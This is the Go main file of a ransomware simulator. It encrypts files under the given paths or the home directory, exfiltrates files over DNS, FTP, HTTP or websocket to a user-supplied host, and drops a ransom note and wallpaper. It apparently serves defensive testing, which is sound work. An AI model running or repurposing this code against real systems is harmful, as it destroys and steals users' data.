package main

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/mjwhitta/cli"
	"github.com/mjwhitta/errors"
	"github.com/mjwhitta/log"
	rw "github.com/mjwhitta/ransimware"
)

var home string

func configureEncryption(sim *rw.Simulator) {
	if flags.encrypt != "" {
		sim.Encrypt = func(fn string, b []byte) ([]byte, error) {
			println(fn)
			return rw.AESEncrypt(flags.encrypt)(fn, b)
		}
	}
}

func configureExfil(sim *rw.Simulator) error {
	var e error

	if flags.exfil != "" {
		sim.ExfilFilenames = flags.names
		sim.ExfilThreshold = flags.threshold

		switch {
		case strings.HasPrefix(flags.exfil, "dns"):
			flags.exfil = strings.TrimPrefix(flags.exfil, "dns")
			flags.exfil = strings.TrimPrefix(flags.exfil, ":")
			flags.exfil = strings.TrimPrefix(flags.exfil, "//")
			sim.Exfil = rw.DNSResolvedExfil(flags.exfil)
		case strings.HasPrefix(flags.exfil, "ftp"):
			sim.Exfil, e = rw.FTPParallelExfil(
				flags.exfil,
				"ftptest",
				"ftptest",
			)
		case strings.HasPrefix(flags.exfil, "http"):
			sim.Exfil = rw.HTTPExfil(flags.exfil, nil)
		case strings.HasPrefix(flags.exfil, "ws"):
			sim.Exfil, e = rw.WebsocketParallelExfil(flags.exfil, nil)
		default:
			e = errors.Newf("unknown exfil protocol: %s", flags.exfil)
		}

		if e != nil {
			return e
		}
	}

	return nil
}

func configureNotify(sim *rw.Simulator) {
	if (flags.note != "") || flags.wallpaper {
		sim.Notify = func() error {
			if flags.note != "" {
				switch runtime.GOOS {
				case "windows":
					_ = rw.RansomNote(
						filepath.Join(home, "desktop", "ransim.txt"),
						flags.note,
					)()
				default:
					_ = rw.RansomNote(
						filepath.Join(home, "ransim.txt"),
						flags.note,
					)()
				}
			}

			if flags.wallpaper {
				_ = rw.WallpaperNotify(
					filepath.Join(home, "desktop", "ransim.png"),
					rw.DefaultPNG,
					rw.DesktopStretch,
					false,
				)()
			}

			return nil
		}
	}
}

func init() {
	var e error

	if home, e = os.UserHomeDir(); e != nil {
		panic(e)
	}
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			if flags.verbose {
				panic(r)
			}

			switch r := r.(type) {
			case error:
				log.ErrX(Exception, r.Error())
			case string:
				log.ErrX(Exception, r)
			}
		}
	}()

	var e error
	var paths []string
	var sim *rw.Simulator

	validate()

	// Get list of targets
	for _, path := range cli.Args() {
		path = strings.TrimSpace(path)
		paths = append(paths, path)
	}

	// Default to home directory
	if len(paths) == 0 {
		paths = []string{home}
	}

	// Create simulator
	sim = rw.New(flags.threads)
	sim.WaitEvery = time.Duration(flags.waitEvery) * time.Second
	sim.WaitFor = time.Duration(flags.waitFor) * time.Second

	configureEncryption(sim)

	if e = configureExfil(sim); e != nil {
		panic(e)
	}

	configureNotify(sim)

	// Add targets
	for _, path := range paths {
		if e = sim.Target(path); e != nil {
			if flags.verbose {
				panic(e)
			}

			log.Err(e.Error())
		}
	}

	// Start simulator
	if e = sim.Run(); e != nil {
		panic(e)
	}
}
